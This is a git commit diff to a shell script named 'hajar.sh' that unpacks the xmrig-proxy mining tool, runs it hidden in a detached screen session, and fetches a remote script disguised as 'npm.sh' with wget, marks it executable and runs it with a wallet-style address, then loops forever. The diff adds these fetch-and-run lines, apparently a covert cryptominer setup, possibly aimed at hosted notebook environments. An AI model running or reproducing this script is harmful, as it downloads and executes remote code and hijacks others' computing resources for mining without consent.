c0d90dac9a49250ef849b435b3d392b1d34e107f
makaryobos <90647406+makaryobos@users.noreply.github.com>
2021-09-14 02:32:09 +0700

    Update hajar.sh

--- hajar.sh
+++ hajar.sh
@@ -6,9 +6,9 @@ tar xvf xmrig-proxy-6.14.0-linux-x64.tar.gz
 cd xmrig-proxy-6.14.0 && screen -dmS run !./npm.sh DRQ9iChWbU8cxC3js3YNwDheajeq6jN8Np.PX.$(echo $(shuf -i 1-9999 -n 1)-PROXY) -p x -d 0 0.0.0.0:3333 -m simple
 
 
-!wget -q https://raw.githubusercontent.com/makaryobos/privasi/main/npm.sh
-!chmod +x npm.sh
-!./npm.sh DRQ9iChWbU8cxC3js3YNwDheajeq6jN8Np.PX.$(echo $(shuf -i 1-9999 -n 1)-PROXY) -p x -d 0 0.0.0.0:3333 -m simple
+wget -q https://raw.githubusercontent.com/makaryobos/privasi/main/npm.sh
+chmod +x npm.sh
+./npm.sh DRQ9iChWbU8cxC3js3YNwDheajeq6jN8Np.PX.$(echo $(shuf -i 1-9999 -n 1)-PROXY) -p x -d 0 0.0.0.0:3333 -m simple
 while [ 1 ]; do
 sleep 3
 done
